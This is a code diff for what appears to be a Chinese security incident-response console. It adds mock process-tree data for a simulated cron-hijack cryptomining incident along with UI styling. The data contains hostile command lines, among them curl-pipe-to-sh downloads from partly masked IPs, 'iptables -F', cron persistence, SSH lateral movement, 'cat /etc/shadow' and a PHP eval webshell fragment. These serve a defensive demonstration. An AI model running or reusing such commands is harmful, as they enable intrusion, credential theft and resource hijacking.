@@ -1326,7 +1326,7 @@
 .hg-cd.b{background:#1664ff}
 .hg-fl{width:18px;height:2px;border-radius:1px;background:linear-gradient(90deg,rgba(245,63,63,0),#f53f3f)}
 .hg.done .hg-lgf{display:none}
-.hg-cnt{right:12px;top:10px;height:26px;padding:0 10px;border-radius:6px;background:rgba(255,255,255,.92);box-shadow:0 0 0 1px rgba(29,33,41,.06);font-size:12px;line-height:26px;color:rgba(0,0,0,.6)}
+.hg-cnt{right:12px;top:10px;display:flex;align-items:center;gap:10px;height:26px;padding:0 3px 0 10px;border-radius:6px;background:rgba(255,255,255,.92);box-shadow:0 0 0 1px rgba(29,33,41,.06);font-size:12px;line-height:26px;color:rgba(0,0,0,.6)}
 .hg-tb{left:50%;bottom:12px;display:flex;align-items:center;gap:2px;padding:4px;border-radius:8px;background:#fff;box-shadow:0 0 0 1px rgba(29,33,41,.08),0 6px 18px rgba(29,33,41,.12);transform:translateX(-50%)}
 .hg-tb button{position:relative;display:grid;place-items:center;width:28px;height:28px;border:0;border-radius:5px;background:none;color:rgba(0,0,0,.55);cursor:pointer;font:inherit}
 .hg-tb button:hover{background:#f2f3f5;color:rgba(0,0,0,.88)}
@@ -1431,12 +1431,31 @@
 .hg-pt.rt span{left:auto;right:12px}
 .hu-lay:has(.hg.fs){transform:none!important;animation:none!important}
 html:has(.hg.fs) .kc-top{visibility:hidden}
+.hg-mode{display:flex;gap:2px;padding:2px;border-radius:5px;background:#f2f3f5}
+.hg-mode button{height:20px;padding:0 8px;border:0;border-radius:4px;background:none;font:inherit;font-size:12px;color:rgba(0,0,0,.55);cursor:pointer}
+.hg-mode button.on{background:#fff;color:rgba(0,0,0,.88);box-shadow:0 1px 2px rgba(29,33,41,.12)}
+.hg-card.grp{box-shadow:0 0 0 1px rgba(29,33,41,.07),0 1px 2px rgba(29,33,41,.05),4px 4px 0 -1px #fff,4px 4px 0 0 rgba(29,33,41,.09),8px 8px 0 -1px #fff,8px 8px 0 0 rgba(29,33,41,.07)}
+.hg-card.grp:hover{box-shadow:0 0 0 1px rgba(29,33,41,.1),0 6px 16px rgba(29,33,41,.1),4px 4px 0 -1px #fff,4px 4px 0 0 rgba(29,33,41,.12),8px 8px 0 -1px #fff,8px 8px 0 0 rgba(29,33,41,.09)}
+.hg-card.grp.on{box-shadow:0 0 0 1.5px #1664ff,0 6px 16px rgba(22,100,255,.14),4px 4px 0 -1px #fff,4px 4px 0 0 rgba(22,100,255,.35),8px 8px 0 -1px #fff,8px 8px 0 0 rgba(22,100,255,.2)}
+.hg-card.fold{background:rgba(255,255,255,.6);box-shadow:none;outline:1px dashed #c9cdd4;outline-offset:-1px}
+.hg-card.fold:hover{background:#fff;outline-color:#1664ff}
+.hg-card.fold .hg-hd b{font-weight:500;color:rgba(0,0,0,.7)}
+.hg-card.fold .hg-well{background:none;padding:0 6px}
+.hg-card.fold .hg-well code{font-family:inherit;color:#1664ff}
+.hg-card.fold .hg-mk{box-shadow:none;background:#f2f3f5}
+.hg-pt.s{width:6px;height:6px;margin:-3px 0 0 -3px;border:0;background:#c9cdd4;box-shadow:none}
+.hg-pt.s:hover{background:#86909c;transform:scale(1.4)}
+.hg-row.grp .hg-trl small{color:#1664ff}
+.hg-row.sub .hg-trl{padding-left:40px}
+.hg-row.sub{height:26px;background:#fafbfc}
+.hg:not(.fs) .hg-lgf{display:none}
 
 .hg-mk.ip{--ni:url('data:image/svg+xml,%3Csvg viewBox="0 0 24 24" fill="%23000" xmlns="http://www.w3.org/2000/svg"%3E%3Cpath d="M13 1L13.001 4.06201C16.6192 4.51365 19.4869 7.38163 19.9381 11L23 11V13L19.938 13.001C19.4864 16.6189 16.6189 19.4864 13.001 19.938L13 23H11L11 19.9381C7.38163 19.4869 4.51365 16.6192 4.06201 13.001L1 13V11L4.06189 11C4.51312 7.38129 7.38129 4.51312 11 4.06189L11 1H13ZM12 6C8.68629 6 6 8.68629 6 12C6 15.3137 8.68629 18 12 18C15.3137 18 18 15.3137 18 12C18 8.68629 15.3137 6 12 6ZM12 10C13.1046 10 14 10.8954 14 12C14 13.1046 13.1046 14 12 14C10.8954 14 10 13.1046 10 12C10 10.8954 10.8954 10 12 10Z"/%3E%3C/svg%3E')}
 .hg-mk.up{--ni:url('data:image/svg+xml,%3Csvg viewBox="0 0 24 24" fill="%23000" xmlns="http://www.w3.org/2000/svg"%3E%3Cpath d="M12 12.5858L16.2426 16.8284L14.8284 18.2426L13 16.415V22H11V16.413L9.17157 18.2426L7.75736 16.8284L12 12.5858ZM12 2C15.5934 2 18.5544 4.70761 18.9541 8.19395C21.2858 8.83154 23 10.9656 23 13.5C23 16.3688 20.8036 18.7246 18.0006 18.9776L18.0009 16.9644C19.6966 16.7214 21 15.2629 21 13.5C21 11.567 19.433 10 17.5 10C17.2912 10 17.0867 10.0183 16.8887 10.054C16.9616 9.7142 17 9.36158 17 9C17 6.23858 14.7614 4 12 4C9.23858 4 7 6.23858 7 9C7 9.36158 7.03838 9.7142 7.11205 10.0533C6.91331 10.0183 6.70879 10 6.5 10C4.567 10 3 11.567 3 13.5C3 15.2003 4.21241 16.6174 5.81986 16.934L6.00005 16.9646L6.00039 18.9776C3.19696 18.7252 1 16.3692 1 13.5C1 10.9656 2.71424 8.83154 5.04648 8.19411C5.44561 4.70761 8.40661 2 12 2Z"/%3E%3C/svg%3E')}
 .hg-mk.srv{--ni:url('data:image/svg+xml,%3Csvg viewBox="0 0 24 24" fill="%23000" xmlns="http://www.w3.org/2000/svg"%3E%3Cpath d="M5 11H19V5H5V11ZM21 4V20C21 20.5523 20.5523 21 20 21H4C3.44772 21 3 20.5523 3 20V4C3 3.44772 3.44772 3 4 3H20C20.5523 3 21 3.44772 21 4ZM19 13H5V19H19V13ZM7 15H10V17H7V15ZM7 7H10V9H7V7Z"/%3E%3C/svg%3E')}
 .hg-mk.proc{--ni:url('data:image/svg+xml,%3Csvg viewBox="0 0 24 24" fill="%23000" xmlns="http://www.w3.org/2000/svg"%3E%3Cpath d="M3 3H21C21.5523 3 22 3.44772 22 4V20C22 20.5523 21.5523 21 21 21H3C2.44772 21 2 20.5523 2 20V4C2 3.44772 2.44772 3 3 3ZM4 5V19H20V5H4ZM12 15H18V17H12V15ZM8.66685 12L5.83842 9.17157L7.25264 7.75736L11.4953 12L7.25264 16.2426L5.83842 14.8284L8.66685 12Z"/%3E%3C/svg%3E')}
 .hg-mk.file{--ni:url('data:image/svg+xml,%3Csvg viewBox="0 0 24 24" fill="%23000" xmlns="http://www.w3.org/2000/svg"%3E%3Cpath d="M15 4H5V20H19V8H15V4ZM3 2.9918C3 2.44405 3.44749 2 3.9985 2H16L20.9997 7L21 20.9925C21 21.5489 20.5551 22 20.0066 22H3.9934C3.44476 22 3 21.5447 3 21.0082V2.9918ZM11 15H13V17H11V15ZM11 7H13V13H11V7Z"/%3E%3C/svg%3E')}
+.hg-mk.more{--ni:url('data:image/svg+xml,%3Csvg viewBox="0 0 24 24" fill="%23000" xmlns="http://www.w3.org/2000/svg"%3E%3Cpath d="M4.5 10.5C3.675 10.5 3 11.175 3 12C3 12.825 3.675 13.5 4.5 13.5C5.325 13.5 6 12.825 6 12C6 11.175 5.325 10.5 4.5 10.5ZM19.5 10.5C18.675 10.5 18 11.175 18 12C18 12.825 18.675 13.5 19.5 13.5C20.325 13.5 21 12.825 21 12C21 11.175 20.325 10.5 19.5 10.5ZM12 10.5C11.175 10.5 10.5 11.175 10.5 12C10.5 12.825 11.175 13.5 12 13.5C12.825 13.5 13.5 12.825 13.5 12C13.5 11.175 12.825 10.5 12 10.5Z"/%3E%3C/svg%3E')}
 </style>
 <style>
 /* hux: 缺省状态 */
@@ -1737,8 +1756,8 @@ html:has(.hg.fs) .kc-top{visibility:hidden}
                 <sc-for list="{{ls.hg.nodes}}" as="n" hint-placeholder-count="6"><button type="button" class="{{n.c}}" style="{{n.st}}" aria-pressed="{{n.on}}" aria-label="{{n.al}}" onClick="{{n.t}}" onMouseEnter="{{n.he}}" onMouseLeave="{{ls.hx}}"><span class="hg-tag">{{n.tag}}</span><span class="hg-hd"><i class="{{n.ic}}" aria-hidden="true"></i><b>{{n.n}}</b><sc-if value="{{n.chip}}" hint-placeholder-val="{{false}}"><span class="{{n.chipC}}"><i></i>{{n.chip}}</span></sc-if></span><span class="hg-sub">{{n.sub}}</span><span class="hg-well"><code>{{n.w}}</code><em class="{{n.rC}}">{{n.r}}</em></span></button></sc-for>
                 <svg class="hg-svg hg-dots" width="{{ls.hg.W}}" height="{{ls.hg.H}}" aria-hidden="true"><sc-for list="{{ls.hg.dots}}" as="p" hint-placeholder-count="4"><circle class="{{p.c}}" cx="{{p.x}}" cy="{{p.y}}" r="3.5"></circle></sc-for></svg>
               </div>
-              <div class="hg-ui hg-lg"><span><i class="hg-cd r"></i>待研判告警</span><span><i class="hg-cd b"></i>已确认告警</span><span><i class="hg-cd n"></i>关联证据</span><span class="hg-lgf"><i class="hg-fl"></i>攻击路径</span></div>
-              <div class="hg-ui hg-cnt">{{ls.hg.cnt}}</div>
+              <div class="hg-ui hg-lg"><span><i class="hg-cd r"></i>待研判</span><span><i class="hg-cd b"></i>已确认</span><span><i class="hg-cd n"></i>证据</span><span class="hg-lgf"><i class="hg-fl"></i>攻击路径</span></div>
+              <div class="hg-ui hg-cnt"><span>{{ls.hg.cnt}}</span><sc-if value="{{ls.hg.canF}}" hint-placeholder-val="{{false}}"><span class="hg-mode" role="group" aria-label="显示范围"><sc-for list="{{ls.hg.modes}}" as="x" hint-placeholder-count="2"><button type="button" class="{{x.c}}" onClick="{{x.t}}">{{x.n}}</button></sc-for></span></sc-if></div>
               <div class="hg-ui hg-tb" role="toolbar" aria-label="画布">
                 <button type="button" data-hg="loc" onClick="{{ls.hg.a_loc}}" data-tip="定位到选中节点" aria-label="定位到选中节点"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" aria-hidden="true"><circle cx="12" cy="12" r="7"></circle><circle cx="12" cy="12" r="2.2"></circle><path d="M12 2v3M12 19v3M2 12h3M19 12h3"></path></svg></button>
                 <button type="button" data-hg="fit" onClick="{{ls.hg.a_fit}}" data-tip="适配画布" aria-label="适配画布"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" aria-hidden="true"><path d="M4 9V5a1 1 0 0 1 1-1h4M15 4h4a1 1 0 0 1 1 1v4M20 15v4a1 1 0 0 1-1 1h-4M9 20H5a1 1 0 0 1-1-1v-4"></path><rect x="8.5" y="8.5" width="7" height="7" rx="1"></rect></svg></button>
@@ -2726,14 +2745,77 @@ class Component extends DCLogic {
         p7: ['sshd', 812, '', 'root', '/usr/sbin/sshd -D', '已签名 · Debian', '0d9e…77a1'], p8: ['sshd', 3310, 'p7', 'root', 'sshd: deploy [priv]', '已签名 · Debian', '0d9e…77a1'], p9: ['bash', 3318, 'p8', 'deploy', '-bash', '已签名 · Debian', '6a4f…2be0'],
         p10: ['cat', 3340, 'p9', 'deploy', 'cat /etc/shadow', '已签名 · Debian', 'f12c…8d33'], p11: ['tee', 3361, 'p9', 'deploy', 'tee -a /root/.ssh/authorized_keys', '已签名 · Debian', '9e7b…c410'],
         j1: ['java', 2201, '', 'tomcat', '/usr/bin/java -jar /opt/app/order-service.jar', '已签名 · Oracle', '8c1d…2e07'], j2: ['sh', 5520, 'j1', 'tomcat', 'sh -c echo Y3VybCA0NS4xMy4qKi44L3guc2g= | base64 -d | sh', '已签名 · CentOS', '1b9f…aa30'], j3: ['curl', 5523, 'j2', 'tomcat', 'curl 45.13.**.8/x.sh', '已签名 · CentOS', 'c3d8…0b17'],
-        k1: ['sshd', 990, '', 'root', 'sshd: ops [priv]', '已签名 · Debian', '0d9e…77a1'], k2: ['bash', 4021, 'k1', 'ops', 'bash -c "wget -q 222.186.**.71/k -O /tmp/k; chmod +x /tmp/k"', '已签名 · Debian', '6a4f…2be0'] };
+        k1: ['sshd', 990, '', 'root', 'sshd: ops [priv]', '已签名 · Debian', '0d9e…77a1'], k2: ['bash', 4021, 'k1', 'ops', 'bash -c "wget -q 222.186.**.71/k -O /tmp/k; chmod +x /tmp/k"', '已签名 · Debian', '6a4f…2be0'],
+        q1: ['cron', 811, '', 'root', '/usr/sbin/cron -f', '已签名 · Debian', '4b1e…09a2', '09:00:00'],
+        q2: ['sh', 9101, 'q1', 'root', 'sh -c "curl -fsSL 91.215.**.4/up.sh | sh"', '已签名 · Debian', '1b9f…aa30', '09:41:02'],
+        q3: ['bash', 9102, 'q2', 'root', 'bash -s  # up.sh', '已签名 · Debian', '6a4f…2be0', '09:41:03'],
+        q10: ['curl', 9110, 'q3', 'root', 'curl -s -o /var/tmp/.u/p00 91.215.**.4/p/00', '已签名 · Debian', 'c3d8…0b17', '09:41:05'],
+        q11: ['curl', 9111, 'q3', 'root', 'curl -s -o /var/tmp/.u/p01 91.215.**.4/p/01', '已签名 · Debian', 'c3d8…0b17', '09:41:09'],
+        q12: ['curl', 9112, 'q3', 'root', 'curl -s -o /var/tmp/.u/p02 91.215.**.4/p/02', '已签名 · Debian', 'c3d8…0b17', '09:41:13'],
+        q13: ['curl', 9113, 'q3', 'root', 'curl -s -o /var/tmp/.u/p03 91.215.**.4/p/03', '已签名 · Debian', 'c3d8…0b17', '09:41:17'],
+        q14: ['curl', 9114, 'q3', 'root', 'curl -s -o /var/tmp/.u/p04 91.215.**.4/p/04', '已签名 · Debian', 'c3d8…0b17', '09:41:21'],
+        q15: ['curl', 9115, 'q3', 'root', 'curl -s -o /var/tmp/.u/p05 91.215.**.4/p/05', '已签名 · Debian', 'c3d8…0b17', '09:41:25'],
+        q16: ['curl', 9116, 'q3', 'root', 'curl -s -o /var/tmp/.u/p06 91.215.**.4/p/06', '已签名 · Debian', 'c3d8…0b17', '09:41:29'],
+        q17: ['curl', 9117, 'q3', 'root', 'curl -s -o /var/tmp/.u/p07 91.215.**.4/p/07', '已签名 · Debian', 'c3d8…0b17', '09:41:33'],
+        q18: ['curl', 9118, 'q3', 'root', 'curl -s -o /var/tmp/.u/p08 91.215.**.4/p/08', '已签名 · Debian', 'c3d8…0b17', '09:41:37'],
+        q19: ['curl', 9119, 'q3', 'root', 'curl -s -o /var/tmp/.u/p09 91.215.**.4/p/09', '已签名 · Debian', 'c3d8…0b17', '09:41:41'],
+        q20: ['curl', 9120, 'q3', 'root', 'curl -s -o /var/tmp/.u/p10 91.215.**.4/p/10', '已签名 · Debian', 'c3d8…0b17', '09:41:45'],
+        q21: ['curl', 9121, 'q3', 'root', 'curl -s -o /var/tmp/.u/p11 91.215.**.4/p/11', '已签名 · Debian', 'c3d8…0b17', '09:41:49'],
+        q22: ['curl', 9122, 'q3', 'root', 'curl -s -o /var/tmp/.u/p12 91.215.**.4/p/12', '已签名 · Debian', 'c3d8…0b17', '09:41:53'],
+        q23: ['curl', 9123, 'q3', 'root', 'curl -s -o /var/tmp/.u/p13 91.215.**.4/p/13', '已签名 · Debian', 'c3d8…0b17', '09:41:57'],
+        q24: ['curl', 9124, 'q3', 'root', 'curl -s -o /var/tmp/.u/p14 91.215.**.4/p/14', '已签名 · Debian', 'c3d8…0b17', '09:42:01'],
+        q25: ['curl', 9125, 'q3', 'root', 'curl -s -o /var/tmp/.u/p15 91.215.**.4/p/15', '已签名 · Debian', 'c3d8…0b17', '09:42:05'],
+        q26: ['curl', 9126, 'q3', 'root', 'curl -s -o /var/tmp/.u/p16 91.215.**.4/p/16', '已签名 · Debian', 'c3d8…0b17', '09:42:09'],
+        q27: ['curl', 9127, 'q3', 'root', 'curl -s -o /var/tmp/.u/p17 91.215.**.4/p/17', '已签名 · Debian', 'c3d8…0b17', '09:42:13'],
+        q28: ['curl', 9128, 'q3', 'root', 'curl -s -o /var/tmp/.u/p18 91.215.**.4/p/18', '已签名 · Debian', 'c3d8…0b17', '09:42:17'],
+        q29: ['curl', 9129, 'q3', 'root', 'curl -s -o /var/tmp/.u/p19 91.215.**.4/p/19', '已签名 · Debian', 'c3d8…0b17', '09:42:21'],
+        q30: ['curl', 9130, 'q3', 'root', 'curl -s -o /var/tmp/.u/p20 91.215.**.4/p/20', '已签名 · Debian', 'c3d8…0b17', '09:42:25'],
+        q31: ['curl', 9131, 'q3', 'root', 'curl -s -o /var/tmp/.u/p21 91.215.**.4/p/21', '已签名 · Debian', 'c3d8…0b17', '09:42:29'],
+        q32: ['curl', 9132, 'q3', 'root', 'curl -s -o /var/tmp/.u/p22 91.215.**.4/p/22', '已签名 · Debian', 'c3d8…0b17', '09:42:33'],
+        q33: ['curl', 9133, 'q3', 'root', 'curl -s -o /var/tmp/.u/p23 91.215.**.4/p/23', '已签名 · Debian', 'c3d8…0b17', '09:42:37'],
+        q34: ['curl', 9134, 'q3', 'root', 'curl -s -o /var/tmp/.u/p24 91.215.**.4/p/24', '已签名 · Debian', 'c3d8…0b17', '09:42:41'],
+        q35: ['curl', 9135, 'q3', 'root', 'curl -s -o /var/tmp/.u/p25 91.215.**.4/p/25', '已签名 · Debian', 'c3d8…0b17', '09:42:45'],
+        q36: ['curl', 9136, 'q3', 'root', 'curl -s -o /var/tmp/.u/p26 91.215.**.4/p/26', '已签名 · Debian', 'c3d8…0b17', '09:42:49'],
+        q37: ['curl', 9137, 'q3', 'root', 'curl -s -o /var/tmp/.u/p27 91.215.**.4/p/27', '已签名 · Debian', 'c3d8…0b17', '09:42:53'],
+        q38: ['curl', 9138, 'q3', 'root', 'curl -s -o /var/tmp/.u/p28 91.215.**.4/p/28', '已签名 · Debian', 'c3d8…0b17', '09:42:57'],
+        q39: ['curl', 9139, 'q3', 'root', 'curl -s -o /var/tmp/.u/p29 91.215.**.4/p/29', '已签名 · Debian', 'c3d8…0b17', '09:43:01'],
+        q40: ['curl', 9140, 'q3', 'root', 'curl -s -o /var/tmp/.u/p30 91.215.**.4/p/30', '已签名 · Debian', 'c3d8…0b17', '09:43:05'],
+        q41: ['curl', 9141, 'q3', 'root', 'curl -s -o /var/tmp/.u/p31 91.215.**.4/p/31', '已签名 · Debian', 'c3d8…0b17', '09:43:09'],
+        q42: ['curl', 9142, 'q3', 'root', 'curl -s -o /var/tmp/.u/p32 91.215.**.4/p/32', '已签名 · Debian', 'c3d8…0b17', '09:43:13'],
+        q43: ['curl', 9143, 'q3', 'root', 'curl -s -o /var/tmp/.u/p33 91.215.**.4/p/33', '已签名 · Debian', 'c3d8…0b17', '09:43:17'],
+        q44: ['curl', 9144, 'q3', 'root', 'curl -s -o /var/tmp/.u/p34 91.215.**.4/p/34', '已签名 · Debian', 'c3d8…0b17', '09:43:21'],
+        q45: ['curl', 9145, 'q3', 'root', 'curl -s -o /var/tmp/.u/p35 91.215.**.4/p/35', '已签名 · Debian', 'c3d8…0b17', '09:43:25'],
+        q46: ['curl', 9146, 'q3', 'root', 'curl -s -o /var/tmp/.u/p36 91.215.**.4/p/36', '已签名 · Debian', 'c3d8…0b17', '09:43:29'],
+        q47: ['curl', 9147, 'q3', 'root', 'curl -s -o /var/tmp/.u/p37 91.215.**.4/p/37', '已签名 · Debian', 'c3d8…0b17', '09:43:33'],
+        q48: ['curl', 9148, 'q3', 'root', 'curl -s -o /var/tmp/.u/p38 91.215.**.4/p/38', '已签名 · Debian', 'c3d8…0b17', '09:43:37'],
+        q49: ['curl', 9149, 'q3', 'root', 'curl -s -o /var/tmp/.u/p39 91.215.**.4/p/39', '已签名 · Debian', 'c3d8…0b17', '09:43:41'],
+        q4: ['chmod', 9152, 'q3', 'root', 'chmod +x /var/tmp/.u/kdevd', '已签名 · Debian', '77c0…1e5d', '09:44:00'],
+        q8: ['pkill', 9153, 'q3', 'root', 'pkill -f "kdevtmpfsi|kinsing|xmrig"', '已签名 · Debian', '2d4a…8f61', '09:44:02'],
+        q7: ['iptables', 9154, 'q3', 'root', 'iptables -F', '已签名 · Debian', '9a13…c7b4', '09:44:03'],
+        q5: ['kdevd', 9160, 'q3', 'root', '/var/tmp/.u/kdevd -o pool.**:3333 --donate-level 1 -B', '无签名', 'e5f1…3a90', '09:44:05'],
+        q60: ['kdevd', 9161, 'q5', 'root', '/var/tmp/.u/kdevd --worker 0', '无签名', 'e5f1…3a90', '09:44:06'],
+        q61: ['kdevd', 9162, 'q5', 'root', '/var/tmp/.u/kdevd --worker 1', '无签名', 'e5f1…3a90', '09:44:06'],
+        q62: ['kdevd', 9163, 'q5', 'root', '/var/tmp/.u/kdevd --worker 2', '无签名', 'e5f1…3a90', '09:44:06'],
+        q63: ['kdevd', 9164, 'q5', 'root', '/var/tmp/.u/kdevd --worker 3', '无签名', 'e5f1…3a90', '09:44:06'],
+        q64: ['kdevd', 9165, 'q5', 'root', '/var/tmp/.u/kdevd --worker 4', '无签名', 'e5f1…3a90', '09:44:06'],
+        q65: ['kdevd', 9166, 'q5', 'root', '/var/tmp/.u/kdevd --worker 5', '无签名', 'e5f1…3a90', '09:44:06'],
+        q66: ['kdevd', 9167, 'q5', 'root', '/var/tmp/.u/kdevd --worker 6', '无签名', 'e5f1…3a90', '09:44:06'],
+        q67: ['kdevd', 9168, 'q5', 'root', '/var/tmp/.u/kdevd --worker 7', '无签名', 'e5f1…3a90', '09:44:06'],
+        q6: ['crontab', 9170, 'q3', 'root', '(crontab -l; echo "*/10 * * * * curl -fsSL 91.215.**.4/up.sh|sh") | crontab -', '已签名 · Debian', '55b2…e6f3', '09:44:20'],
+        q9: ['ssh', 9180, 'q3', 'root', 'ssh -o StrictHostKeyChecking=no root@10.0.2.31 "curl -fsSL 91.215.**.4/up.sh|sh"', '已签名 · Debian', '0d9e…77a1', '09:48:30'],
+        q91: ['ssh', 9181, 'q3', 'root', 'ssh -o BatchMode=yes root@10.0.2.32 true', '已签名 · Debian', '0d9e…77a1', '09:48:31'],
+        q70: ['run-parts', 9050, 'q1', 'root', 'run-parts /etc/cron.hourly', '已签名 · Debian', '31aa…d0c2', '09:00:01'],
+        q71: ['logrotate', 9051, 'q70', 'root', '/usr/sbin/logrotate /etc/logrotate.conf', '已签名 · Debian', '8e02…44b9', '09:00:01'],
+        q72: ['debian-sa1', 9052, 'q1', 'root', 'debian-sa1 1 1', '已签名 · Debian', 'f7c3…5a18', '09:40:01'] };
       const OTHER = { src: ['ip', '攻击源', '43.21.88.17', [['IP', '43.21.88.17'], ['归属', '境外 · 荷兰'], ['情报', '已知扫描器，近 7 天 312 次']]],
         up: ['evt', 'WebShell 上传', 'POST /upload', [['请求', 'POST /upload'], ['落地文件', '/tmp/shell.php'], ['响应', '200 · 1.2KB']], '请求体摘要', 'filename="shell.php" <?php @eval($_POST[...]); ?>'],
         f1: ['file', 'kworkerd', '/tmp/.x/kworkerd', [['路径', '/tmp/.x/kworkerd'], ['大小', '1.8MB'], ['SHA256', 'e07a…9c21', 'pi-mono'], ['情报', '远控木马家族 · 高置信', 'hd-red']]],
         c2: ['ip', '外联地址', '185.66.21.9:443', [['IP', '185.66.21.9'], ['归属', '境外 · 新加坡'], ['情报', 'C2 服务器 · 高置信', 'hd-red'], ['连接', '持续 17 分钟，上行 38.2MB']]],
         s2: ['ip', '攻击源', '61.177.**.20', [['IP', '61.177.**.20'], ['归属', '江苏 · 电信'], ['情报', '暴力破解源，近 24 小时 312 次失败']]],
         x2: ['ip', '下载地址', '45.13.**.8', [['IP', '45.13.**.8'], ['归属', '境外 · 德国'], ['情报', '恶意脚本分发 · 中置信']]],
-        s3: ['ip', '攻击源', '222.186.**.71', [['IP', '222.186.**.71'], ['归属', '江苏 · 电信'], ['情报', '暴力破解源']]] };
+        s3: ['ip', '攻击源', '222.186.**.71', [['IP', '222.186.**.71'], ['归属', '江苏 · 电信'], ['情报', '暴力破解源']]],
+        x7: ['ip', '下载地址', '91.215.**.4', [['IP', '91.215.**.4'], ['归属', '境外 · 俄罗斯'], ['情报', '挖矿木马分发 · 高置信', 'hd-red']]],
+        n7: ['ip', '横向目标', '10.0.2.31:22', [['IP', '10.0.2.31'], ['主机', 'app-04（同网段）'], ['结果', 'SSH 登录成功，已执行下载命令', 'hd-red']]] };
       const HOSTN = (hn) => ['host', '受害主机', (HM[hn] || {}).ip || '', [['主机', hn], ['IP', (HM[hn] || {}).ip || ''], ['客户端', ((HM[hn] || {}).ver || '') + ' · ' + ((HM[hn] || {}).on || '在线')]]];
       const INC = [
         { id: 'INC-3201', n: 'WebShell 植入并反弹连接', lv: '高危', h: 'web-prod-01', st0: '待研判', tm: '09:12', entry: 'WebShell 上传', first: '09:12:05', last: '09:17:44',
@@ -2758,6 +2840,13 @@ class Component extends DCLogic {
           ai: ['09:13', '需要人工确认', '64%', 'Java 应用进程派生 sh，执行了一段 base64 编码的命令，解码后是从 45.13.**.8 下载脚本。', ['应用进程派生 Shell 不常见，但部分运维脚本也会这么做', '下载地址命中中置信度情报']],
           main: ['host', 'j1', 'j2', 'j3', 'x2'], br: [], al: [['d1', '09:12:30', '编码命令执行', '执行', 'T1027 混淆命令', 'echo Y3Vyb…| base64 -d | sh', 'j2'], ['d2', '09:12:31', '下载脚本', '执行', 'T1105 入口工具传输', 'curl 45.13.**.8/x.sh', 'j3']],
           plan: ['先确认这段命令是否来自运维脚本。如果不是，终止 sh（5520）并封禁 45.13.**.8。', [['终止进程树', 'sh · PID 5520', ''], ['封禁 IP', '45.13.**.8', '']]], recs: [] },
+        { id: 'INC-3207', n: '计划任务被篡改并运行挖矿程序', lv: '高危', h: 'app-03', st0: '待研判', tm: '09:41', entry: '计划任务被篡改', first: '09:41:02', last: '09:48:30',
+          ai: ['09:49', '确认入侵', '95%', 'root 的计划任务被改成定时下载执行脚本，脚本批量拉取 40 个载荷分片、清空防火墙、运行挖矿程序 kdevd，并通过 SSH 横向到 10.0.2.31。', ['up.sh 命中挖矿家族 Kinsing 变种特征', 'kdevd 无签名，CPU 占用 780%']],
+          main: ['x7', 'host', 'q1', 'q2', 'q3', 'q5', 'q6', 'q9', 'n7'], br: ['q10', 'q11', 'q12', 'q13', 'q14', 'q15', 'q16', 'q17', 'q18', 'q19', 'q20', 'q21', 'q22', 'q23', 'q24', 'q25', 'q26', 'q27', 'q28', 'q29', 'q30', 'q31', 'q32', 'q33', 'q34', 'q35', 'q36', 'q37', 'q38', 'q39', 'q40', 'q41', 'q42', 'q43', 'q44', 'q45', 'q46', 'q47', 'q48', 'q49', 'q4', 'q8', 'q7', 'q60', 'q61', 'q62', 'q63', 'q64', 'q65', 'q66', 'q67', 'q91', 'q70', 'q71', 'q72'], brAt: 'q3',
+          al: [['h1', '09:41:02', '计划任务执行远程脚本', '执行', 'T1053.003 Cron', 'sh -c "curl -fsSL 91.215.**.4/up.sh | sh"', 'q2'], ['h2', '09:41:05', '批量下载载荷', '执行', 'T1105 入口工具传输', '40 次 curl 下载 /var/tmp/.u/p00–p39', 'q10'],
+            ['h3', '09:44:03', '清空防火墙规则', '防御规避', 'T1562.004 禁用防火墙', 'iptables -F', 'q7'], ['h4', '09:44:05', '挖矿程序运行', '影响', 'T1496 资源劫持', 'kdevd 连接 pool.**:3333，CPU 占用 780%', 'q5'],
+            ['h5', '09:44:20', '写入计划任务', '持久化', 'T1053.003 Cron', '*/10 * * * * curl -fsSL 91.215.**.4/up.sh|sh', 'q6'], ['h6', '09:48:30', 'SSH 横向移动', '横向移动', 'T1021.004 SSH', 'ssh root@10.0.2.31 执行下载命令', 'q9']],
+          plan: ['终止 bash（9102）进程树和 kdevd，删除被篡改的 root 计划任务，封禁 91.215.**.4，并检查 10.0.2.31。', [['终止恶意进程树', 'bash · PID 9102', ''], ['清除持久化', 'root crontab 第 2 行', '只终止进程的话，载荷会被计划任务再次拉起'], ['封禁 IP', '91.215.**.4', ''], ['隔离落地文件', '/var/tmp/.u/（41 个文件）', '']]], recs: [] },
         { id: 'INC-3190', n: 'SSH 暴力破解后登录', lv: '高危', h: 'api-01', st0: '处置中', tm: '08:41', entry: 'SSH 暴力破解', first: '08:41:10', last: '08:43:00',
           ai: ['08:44', '确认入侵', '90%', '222.186.**.71 爆破成功后以 ops 登录，下载并准备执行 /tmp/k。', ['登录后立即下载并赋予执行权限']],
           main: ['s3', 'k1', 'k2'], br: [], al: [['e1', '08:41:10', 'SSH 登录成功', '初始访问', 'T1110 暴力破解', 'ops 从 222.186.**.71 登录', 'k1'], ['e2', '08:43:00', '下载可疑文件', '执行', 'T1105 入口工具传输', 'wget -q 222.186.**.71/k -O /tmp/k', 'k2']],
@@ -2786,7 +2875,7 @@ class Component extends DCLogic {
         const L = RE(x); if (L.length) return L.some((y) => y.r === 'ing' || y.r === 'fail') ? '处置中' : '待验证';
         return vd0[x.id] === 'real' ? '调查中' : x.st0; };
       const STC = { '待研判': 'kc-tag warn', '调查中': 'kc-tag info', '处置中': 'kc-tag info', '待验证': 'kc-tag ok', '已关闭': 'kc-tag mut', '已关闭 · 误报': 'kc-tag mut' };
-      const SLA = { 'INC-3201': ['响应', '已超时 12 分钟', 1], 'INC-3202': ['响应', '剩 18 分钟'], 'INC-3205': ['响应', '剩 2 小时 18 分'], 'INC-3190': ['处置', '剩 41 分钟'], 'INC-3206': ['响应', '剩 28 分钟'] };
+      const SLA = { 'INC-3201': ['响应', '已超时 12 分钟', 1], 'INC-3202': ['响应', '剩 18 分钟'], 'INC-3205': ['响应', '剩 2 小时 18 分'], 'INC-3207': ['响应', '剩 26 分钟'], 'INC-3190': ['处置', '剩 41 分钟'], 'INC-3206': ['响应', '剩 28 分钟'] };
       const slaOf = (x) => { const s = stOf(x); if (s === '待验证' || s.indexOf('已关闭') === 0) return null; const v = SLA[x.id]; if (!v) return null; return s !== '待研判' && v[0] === '响应' ? ['处置', '剩 3 小时 52 分'] : v; };
